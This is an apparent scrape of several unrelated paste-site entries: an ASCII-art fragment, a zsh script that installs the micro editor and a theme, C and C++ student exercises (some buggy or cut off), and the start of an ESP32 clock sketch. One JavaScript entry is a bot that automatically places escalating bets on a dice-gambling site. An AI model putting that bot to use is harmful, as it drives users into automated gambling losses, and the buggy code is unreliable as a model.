                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee11111111114444444444444444444441111111111eeeeeeeeee444444444444444444444eeeeeeeeee1111111111eeeeeeeeee                               
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     eeeeeeeeee111111111144444444444444444444411111111111111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                               1111111111111111111111111111111eeeeeeeeee1111111111111111111111111111111111111111144444444444444444444eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111114444444444444444444411111111111eeeeeeeeee11111111111111111111eeeeeeeeeee                    
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          11111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111111111111111111111111eeeeeeeeee                               
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111111111111111111111111111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
          111111111111111111111444444444444444444441111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                     1111111111111111111111111111111111111111111111111111111111111111111111111111111111444444444444444444441111111111eeeeeeeeeee                    
                               11111111111111111111111111111114444444444444444444411111111111111111111111111111111111111111eeeeeeeeee                               
                               11111111111111111111111111111114444444444444444444411111111111111111111111111111111111111111eeeeeeeeee                               
                               11111111111111111111111111111114444444444444444444411111111111111111111111111111111111111111eeeeeeeeee                               
                               11111111111111111111111111111114444444444444444444411111111111111111111111111111111111111111eeeeeeeeee                               "
kGTHt6WJ,micro-install,tygcrawford,Bash,Sunday 12th of May 2024 05:36:27 PM CDT,"#!/usr/bin/env zsh

brew install micro wget jq 

settings=~/.config/micro/settings.json

if [ ! -f $settings ]; then
  yes | micro -clean
fi

echo $(jq '.colorscheme = ""catppuccin-mocha""' $settings) > $settings

if [[ $MICRO_TRUECOLOR != 1 ]]; then 
  echo 'export ""MICRO_TRUECOLOR=1""' >> ~/.zshrc
  export ""MICRO_TRUECOLOR=1""
fi

theme=""https://raw.githubusercontent.com/catppuccin/micro/main/src/catppuccin-mocha.micro""
theme_path=~/.config/micro/colorschemes/catppuccin-mocha.micro

if [ ! -f $theme_path ]; then
  mkdir ~/.config/micro/colorschemes
  wget $theme -P ~/.config/micro/colorschemes
fi"
wADfUNdP,Pets,Zeshin,C,Sunday 12th of May 2024 05:19:37 PM CDT,"#include <stdio.h>
#include <stdlib.h>

struct Pet{
    char owner[30];
    char chip[7];
    float price;
};

struct Pet Add_Pet(){
    FILE* file;
    file = fopen(""animalsText.txt"", ""w"");
    if(file == NULL){
        fprintf(stderr, ""FILE ERROR"");
        exit(-1);
    }
    struct Pet p;
    scanf(""%s"", p.owner);
    scanf(""%s"", p.chip);
    scanf(""%4f"", &p.price);
    fprintf(file, ""%s,%.2f\n"", p.owner, p.price);
    fclose(file);
    return p;
}

void search_by_price(struct Pet* pets, int size, float price){
    int flag = 1;
    for(int i=0;i<size;i++){
        if(pets[i].price == price){
            printf(""\n%s - %s\n"", pets[i].owner, pets[i].chip);
            flag = 0;
        }
    }
    if(flag){
        printf(""\nNo such price found!\n"");
    }
}

void bin_search(float price){
    FILE* file;
    file = fopen(""animalsBin.bin"", ""rb"");
    int size;
    while(fread(&size, sizeof(int), 1, file)==1){
        char *name =(char*)calloc(size+1, sizeof(char));
        fread(name, sizeof(char), size, file);
        name[size] = '\0';
        char chip[8];
        fread(chip, sizeof(char), 7, file);
        chip[7] = '\0';
        float p;
        fread(&p, sizeof(float), 1, file);
        if(p >= price){
            printf(""\nOwner: %s\n"", name);
            printf(""Chip: %s\n"", chip);
            printf(""Price: %.2f\n"", p);
        }
    }
    fclose(file);

}

int main(){
    FILE* file;
    file = fopen(""animalsBin.bin"", ""wb"");
    if(file == NULL){
        fprintf(stderr, ""FILE ERROR"");
        exit(-1);
    }
    char name[5] = ""denis"";
    int size = 5;
    char chip[7] = ""A12345B"";
    float price = 40;
    fwrite(&size, sizeof(int), 1, file);
    fwrite(name, sizeof(char), 5, file);
    fwrite(chip, sizeof(char), 7, file);
    fwrite(&price, sizeof(float), 1, file);
    fclose(file);
    //
    struct Pet* pets =(struct Pet*)malloc(sizeof(struct Pet)*5);
    pets[0] = Add_Pet();
    search_by_price(pets, 5, 30);
    bin_search(30);
}
"
qAfuHwT1,snowybot,coinwalk,JavaScript,Sunday 12th of May 2024 05:08:31 PM CDT,"var olderest = parseFloat(document.getElementById('pct_balance').value);
var prefit = 0.00001;
var beast = prefit;
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var chickendinner = (olderest*24000);
var great = olderest;
var original = olderest;
var flyt = 6.9;
var doner = 2.9;
var snowy = ((Math.floor(olderest/tens))*tens);
var snowie = olderest;
var olfen = olderest;
var dork = olderest;
var fart = 0.02;
var joe = 0;
var jim = 0;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-olderest).toFixed(8));
console.log(""profit"");
console.log(dog);
if (great>(snowy+(beast*flyt))) {
    beast = beast*2;
    flyt = 4.9;
    doner = 4.9;
    snowy = parseFloat(great);
}
if ((great<(snowy-(beast*doner)))&&(jim<=1)) {
    beast = beast*2;
    flyt = 4.9;
    doner = 4.9;
    jim = jim+1;
    snowy = parseFloat(great);
} 
if ((great<(snowy-(beast*doner)))&&(jim>=2)&&(jim<3)) {
    beast = beast*2;
    flyt = 4.9;
    doner = 1.9;
    jim = jim+1;
    snowy = parseFloat(great);
}
 if ((great<(snowy-(beast*doner)))&&(jim>=3)){
    beast = prefit;
    flyt = 6.9;
    doner = 2.9;
    jim = 0;
    snowie = parseFloat(great);
    snowy = ((Math.floor(great/tens))*tens);
}
if (great>snowie){
    snowie = parseFloat(great);
}
if ((((great*0.012)-beast)<=0)&&(great>=snowie)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    flyt = 6.9;
    doner = 2.9;
    snowy = ((Math.floor(great/tens))*tens);
}
if (great>=chickendinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();"
G7TTNwaU,Untitled,keker123,C++,Sunday 12th of May 2024 05:01:36 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <dirent.h>
#include <err.h>


int semaphoreRead = -1;
int semaphoreWrite = -1;

void acquire() {
    if (write(semaphoreWrite, ""a"", 1) == -1) {
        err(1, ""write"");
    }
}

void release() {
    char buf;
    if (read(semaphoreRead, &buf, 1) == -1) {
        err(1, ""read"");
    }
}

void make(char *path);

void watcher(char *executable) {
    char path[300];
    getcwd(path, 300);
    printf(""path: %s\n"", path);
    printf(""watcher: %s\n"", executable);
    pid_t pid = fork();
    if (pid == -1) {
        err(1, ""fork"");
    } else if (pid == 0) { // Child process
        char fullpath[400];
        snprintf(fullpath, sizeof(fullpath), ""%s/%s"", path, executable + 2);
        printf(""fullpath: %s\n"", fullpath);
        char* params[] = {executable, NULL};
        execvp(""fullpath"", &executable);
        err(1, ""execp"");
    } else { // Parent process
        int status;
        waitpid(pid, &status, 0);
        release();
    }
}

void traverse_directory(char *path) {
    DIR *dir = opendir(path);
    printf(""dir: %s\n"", path);
    if (dir == NULL) {
        err(1, ""opendir"");
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ""."") == 0 || strcmp(entry->d_name, "".."") == 0) {
            continue;
        }

        char full_path[PATH_MAX];
        snprintf(full_path, sizeof(full_path), ""%s/%s"", path, entry->d_name);
        printf(""full_path: %s\n"", full_path);
        if (entry->d_type == DT_DIR) { // If entry is a directory, recursively traverse it
            printf(""full_path_dir: %s\n"", full_path);
            traverse_directory(full_path);
        } else if (access(full_path, X_OK) == 0) { // If entry is executable, run watcher
            acquire();
            printf(""full_path exec: %s\n"", full_path);
            watcher(full_path);
        }
    }

    closedir(dir);
}

void make(char *path) {
    traverse_directory(path);
    while (semaphoreWrite > 0) {
        acquire();
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, ""Usage: %s <max_parallelism>\n"", argv[0]);
        exit(1);
    }

    int max_parallelism = atoi(argv[1]);
    if (max_parallelism <= 0) {
        fprintf(stderr, ""Invalid argument: %s\n"", argv[1]);
        exit(1);
    }

    // Create semaphore using a pipe
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        err(1, ""pipe"");
    }
    semaphoreRead = pipefd[0]; // Use the read end of the pipe as the semaphore
    semaphoreWrite = pipefd[1];

    make(""."");
    close(pipefd[0]);
    close(pipefd[1]);

    return 0;
}
"
QQnD4Lic,Untitled,keker123,C++,Sunday 12th of May 2024 05:01:05 PM CDT,"#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <dirent.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
#include <string.h> 
#include <fcntl.h> 
#include <sys/wait.h> 
#include <err.h> 
 
#define MAX_PATH_LENGTH 1024 
 
int pipefd[2]; 
 
void explore_and_execute(const char *dirpath) { 
    DIR *dir; 
    struct dirent *entry; 
    char path[MAX_PATH_LENGTH]; 
    struct stat statbuf; 
    int active_processes = 0; 
 
    if (!(dir = opendir(dirpath))) 
        return; 
 
    while ((entry = readdir(dir)) != NULL) { 
        if (strcmp(entry->d_name, ""."") == 0 || strcmp(entry->d_name, "".."") == 0) 
            continue; 
 
        sprintf(path, ""%s/%s"", dirpath, entry->d_name); 
        if (stat(path, &statbuf) == -1) 
            continue; 
 
        if (S_ISDIR(statbuf.st_mode)) { 
            char dummy; 
            read(pipefd[0], &dummy, 1); 
            pid_t pid = fork(); 
            if (pid == 0) { 
                explore_and_execute(path); 
                exit(0); 
            } else if (pid > 0) { 
                active_processes++; 
                write(pipefd[1], &dummy, 1); 
            } 
        } else if (S_ISREG(statbuf.st_mode) && (statbuf.st_mode & S_IXUSR)) { 
            char dummy; 
            if (read(pipefd[0], &dummy, 1) != 1) { 
                err(1, ""read from pipe""); 
            } 
            pid_t pid = fork(); 
            if (pid < 0) { 
                err(1, ""fork""); 
            } else if (pid == 0) { 
                execl(path, path, (char *)NULL); 
                err(1, ""execl""); 
            } 
            wait(NULL); 
            if (write(pipefd[1], &dummy, 1) != 1) { 
                err(1, ""write to pipe""); 
            } 
        } 
    } 
    while (active_processes > 0) { 
        wait(NULL); 
        active_processes--; 
    } 
    closedir(dir); 
} 
 
void check_pipe(int limit_) { 
    for(int i = 0; i < limit_; i++) if(write(pipefd[1], ""1"", 1) != 1) err(1, ""initialize error""); 
} 
 
int main(int argc, char *argv[]) { 
    int k = atoi(argv[1]); 
    pipe(pipefd); 
    check_pipe(k); 
 
    explore_and_execute("".""); 
 
    close(pipefd[0]); 
    close(pipefd[1]); 
 
    return 0; 
}"
h2tbvdcB,Untitled,keker123,C++,Sunday 12th of May 2024 04:59:04 PM CDT,"#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <dirent.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
#include <string.h> 
#include <fcntl.h> 
#include <sys/wait.h> 
#include <err.h> 
 
#define MAX_PATH_LENGTH 1024 
 
int pipefd[2]; 
 
void explore_and_execute(const char *dirpath) { 
    DIR *dir; 
    struct dirent *entry; 
    char path[MAX_PATH_LENGTH]; 
    struct stat statbuf; 
    int active_processes = 0; 
 
    if (!(dir = opendir(dirpath))) 
        return; 
 
    while ((entry = readdir(dir)) != NULL) { 
        if (strcmp(entry->d_name, ""."") == 0 || strcmp(entry->d_name, "".."") == 0) 
            continue; 
 
        sprintf(path, ""%s/%s"", dirpath, entry->d_name); 
        if (stat(path, &statbuf) == -1) 
            continue; 
 
        if (S_ISDIR(statbuf.st_mode)) { 
            char dummy; 
            read(pipefd[0], &dummy, 1); 
            pid_t pid = fork(); 
            if (pid == 0) { 
                explore_and_execute(path); 
                exit(0); 
            } else if (pid > 0) { 
                active_processes++; 
                write(pipefd[1], &dummy, 1); 
            } 
        } else if (S_ISREG(statbuf.st_mode) && (statbuf.st_mode & S_IXUSR)) { 
            char dummy; 
            if (read(pipefd[0], &dummy, 1) != 1) { 
                err(1, ""read from pipe""); 
            } 
            pid_t pid = fork(); 
            if (pid < 0) { 
                err(1, ""fork""); 
            } else if (pid == 0) { 
                execl(path, path, (char *)NULL); 
                err(1, ""execl""); 
            } 
            wait(NULL); 
            if (write(pipefd[1], &dummy, 1) != 1) { 
                err(1, ""write to pipe""); 
            } 
        } 
    } 
    while (active_processes > 0) { 
        wait(NULL); 
        active_processes--; 
    } 
    closedir(dir); "
UEbgCSdz,ESP32 IdeaSpark SNTP clock,jgoy,C++,Sunday 12th of May 2024 03:55:28 PM CDT,"#include <WiFiManager.h>          // https://github.com/tzapu/WiFiManager/
#include <Adafruit_SSD1306.h>     // https://github.com/adafruit/Adafruit_SSD1306
#include <Fonts/FreeMono9pt7b.h>  // board: https://nl.aliexpress.com/item/1005006269242344.html
#include <Fonts/FreeSansBold9pt7b.h>
#include <Fonts/FreeSansBold18pt7b.h>

WiFiManager myWiFi;
Adafruit_SSD1306 oled(128, 64, &Wire, -1);

uint8_t SCREEN_ORIENTATION = 2;
char* timeZone = ""CET-1CEST,M3.5.0,M10.5.0/3"";  // https://github.com/nayarsystems/posix_tz_db/blob/master/zones.csv
char* days[] = { ""zondag"", ""maandag"", ""dinsdag"", ""woensdag"", ""donderdag"", ""vrijdag"", ""zaterdag"" };
